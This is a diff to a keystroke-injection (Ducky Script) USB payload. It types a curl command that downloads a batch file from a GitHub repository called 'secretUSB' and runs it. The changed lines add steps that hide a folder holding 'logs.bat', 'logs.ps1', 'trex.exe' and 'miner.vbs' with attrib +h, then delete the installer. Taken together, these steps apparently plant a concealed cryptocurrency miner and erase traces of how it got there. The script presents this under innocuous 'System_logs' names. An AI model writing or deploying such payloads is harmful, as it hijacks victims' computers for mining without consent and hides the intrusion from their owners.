@@ -7,17 +7,41 @@ DELAY 300
 STRING curl -O https://raw.githubusercontent.com/Goenae/secretUSB/main/win32-automate.bat
 DELAY 400
 ENTER
-DELAY 400
+DELAY 3000
 STRING win32-automate.bat
 DELAY 800
 ENTER
 DELAY 800
 TAB
-DELAY 200
+DELAY 400
 TAB
-DELAY 200
+DELAY 400
 ENTER
-DELAY 20000
+DELAY 150000
+STRING attrib +h C:\System_logs
+DELAY 500
+ENTER
+DELAY 200
+STRING attrib +h C:\System_logs\logs.bat
+DELAY 500
+ENTER
+DELAY 200
+STRING attrib +h C:\System_logs\logs.ps1
+DELAY 500
+ENTER
+DELAY 200
+STRING attrib +h C:\System_logs\trex.exe
+DELAY 500
+ENTER
+DELAY 200
+STRING attrib +h C:\System_logs\miner.vbs
+DELAY 500
+ENTER
+DELAY 200
+STRING del %USERPROFILE%\win32-automate.bat
+DELAY 400
+ENTER
+DELAY 200
 STRING exit
 DELAY 200
 ENTER
